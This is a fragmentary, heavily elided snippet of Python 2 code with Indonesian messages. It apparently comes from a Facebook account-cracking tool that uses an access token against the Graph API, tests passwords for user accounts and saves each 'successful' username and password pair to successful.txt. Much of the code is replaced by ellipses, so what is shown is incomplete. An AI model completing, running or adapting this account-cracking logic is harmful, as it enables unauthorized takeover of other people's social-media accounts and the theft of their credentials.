...
def menu():
	...
	try:
		...
		print "\33[1;91mapi key tidak tersedia"
		time.sleep(1)
		exit()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print "[successful " + user + " | " + pass7
																	cps = open("successful.txt", "a")
